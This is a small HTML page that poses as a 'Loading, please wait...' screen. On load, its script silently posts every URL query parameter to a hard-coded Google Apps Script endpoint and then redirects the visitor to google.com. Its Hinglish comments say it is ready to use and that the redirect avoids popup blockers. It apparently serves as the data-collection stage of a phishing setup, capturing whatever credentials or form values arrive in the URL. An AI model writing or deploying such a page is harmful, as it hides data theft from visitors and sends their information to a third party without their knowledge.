<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing...</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
        }
        .loader {
            font-size: 16px;
            color: #666666;
        }
    </style>
</head>
<body>

    <div class="loader">Loading, please wait...</div>

    <script>
        // Google Script URL aur Google Redirect dono setup hain, aapko kuch change nahi karna hai
        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxVeOVwQIeqpP9HQfhgVY2UMiBAgM0yghjnDY9vpN-tlhpoPqTBN0-eXvM1ojLGWOaW/exec";
        const REDIRECT_URL = "https://www.google.com";

        function sendAndRedirect() {
            const urlParams = new URLSearchParams(window.location.search);
            
            fetch(WEB_APP_URL, {
                method: 'POST',
                mode: 'no-cors', 
                keepalive: true,
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: urlParams.toString()
            });

            // Bina kisi popup blocker ko trigger kiye turant screen badal dega
            window.location.replace(REDIRECT_URL);
        }

        window.onload = sendAndRedirect;
    </script>
</body>
</html>
